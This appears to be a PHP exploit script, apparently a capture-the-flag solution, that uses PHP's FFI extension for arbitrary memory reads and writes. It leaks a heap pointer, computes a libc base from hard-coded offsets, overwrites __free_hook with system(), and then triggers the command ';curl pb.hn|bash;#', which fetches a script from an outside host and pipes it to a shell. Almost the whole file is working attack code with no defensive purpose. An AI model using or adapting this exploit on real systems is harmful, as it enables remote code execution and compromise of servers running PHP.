<?php 

function hex_dump($data, $newline="\n")
{
  static $from = '';
  static $to = '';

  static $width = 16; # number of bytes per line

  static $pad = '.'; # padding for non-visible characters

  if ($from==='')
  {
    for ($i=0; $i<=0xFF; $i++)
    {
      $from .= chr($i);
      $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
    }
  }

  $hex = str_split(bin2hex($data), $width*2);
  $chars = str_split(strtr($data, $from, $to), $width);

  $offset = 0;
  foreach ($hex as $i => $line)
  {
    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . ']' . $newline;
    $offset += $width;
  }
}

function u64($strng){
    $val = 0;
    for($i = 0; $i < 8; ++$i){
        $val |= (ord($strng[$i]) << ($i*8));
    }
    return $val;
}

function hex($val){
    return dechex($val);
}


function arb_read($addr, $size=0x8){
    return FFI::string(FFI::cast("char *", $addr), $size);
}

function arb_write($addr, $val){
    $sice = FFI::cast("long long *", $addr);
    $sice[0] = $val;
}

$ip = FFI::new("int");
$ptr_sice = FFI::addr($ip);
$read_data = FFI::string($ptr_sice, 100);

$ptr_leak = u64(substr($read_data, 0x8, 0x10)) & 0xfffffffff000; 

printf("Leek -> 0x%x\n", $ptr_leak);

$libc_base = $ptr_leak + (11869+9)*0x1000;//had to dump infinite remote memory to figure it out
$free_hook = $libc_base + 0x1BD8E8;
$system = $libc_base + 0x449c0;

arb_write($free_hook, $system);

echo "LOL";

$cmd = ";curl pb.hn|bash;#";

$cmd();

?>
